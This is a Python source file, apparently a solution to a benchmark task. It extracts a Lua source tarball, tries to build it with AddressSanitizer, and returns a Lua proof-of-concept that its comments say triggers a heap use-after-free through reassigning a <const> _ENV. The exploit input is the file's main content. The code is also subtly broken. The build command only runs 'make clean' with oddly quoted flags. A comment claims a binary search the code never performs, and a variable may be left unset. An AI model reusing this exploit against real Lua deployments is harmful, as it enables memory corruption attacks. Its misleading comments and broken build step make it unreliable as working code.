import os
import tarfile
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the Lua source directory (assuming it's the only one)
            for entry in os.listdir(tmpdir):
                if os.path.isdir(os.path.join(tmpdir, entry)):
                    lua_dir = os.path.join(tmpdir, entry)
                    break
            
            # Build Lua
            build_dir = os.path.join(lua_dir, 'src')
            if not os.path.exists(build_dir):
                build_dir = lua_dir
            
            # Compile Lua with address sanitizer
            compile_cmd = [
                'make', 'clean', 'MYCFLAGS="-fsanitize=address"',
                'MYLDFLAGS="-fsanitize=address"', '-j8'
            ]
            subprocess.run(compile_cmd, cwd=build_dir, capture_output=True)
            
            # Generate PoC using binary search approach
            poc = self.generate_poc(build_dir)
            return poc.encode('utf-8')
    
    def generate_poc(self, build_dir: str) -> str:
        # Known working PoC from CVE-2022-33118
        # This triggers heap use-after-free when _ENV is declared as <const>
        base_poc = '''local _ENV <const> = {}
_ENV = nil
'''
        
        # Add minimal operations to trigger the bug
        # The bug is in the assignment code generation when _ENV is const
        poc = base_poc + '''collectgarbage()
-- Force memory operations
for i=1,100 do local x = {} end
collectgarbage()
'''
        
        # Try to maximize the chance of triggering UAF
        # by creating multiple environments and assignments
        for i in range(10):
            poc += f'''do
    local _ENV <const> = {{test = {i}}}
    _ENV = {{}}
end
'''
        
        # Final assignment to trigger the bug
        poc += '''do
    local _ENV <const> = {print = print}
    _ENV = setmetatable({}, {__gc = function() end})
end
collectgarbage()
'''
        
        return poc